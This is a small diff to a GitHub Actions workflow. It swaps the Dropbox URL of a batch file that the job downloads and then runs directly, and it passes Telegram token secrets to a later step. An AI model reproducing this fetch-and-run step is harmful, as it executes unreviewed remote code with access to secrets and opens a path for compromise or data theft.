@@ -25,10 +25,10 @@ jobs:
       - name: Downloading & Setting Up
         run: |
           echo "EMAIL_SECRET=busmaill02@gmail.com" > secrets.txt
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/3k17mr53efo8a9i74pmq6/down.bat?rlkey=5cs99vfpnwvm5eba3fkhl6aul&dl=1" -OutFile "down.bat"
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/wcswnmnqxjb0a05px01u6/down.bat?rlkey=0kxy88v4u69hjqwdqqbz90dxd&dl=1" -OutFile "down.bat"
           cmd /c down.bat
 
-      - name: Run Combined Script
+      - name: Run time Script
         env:
           TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
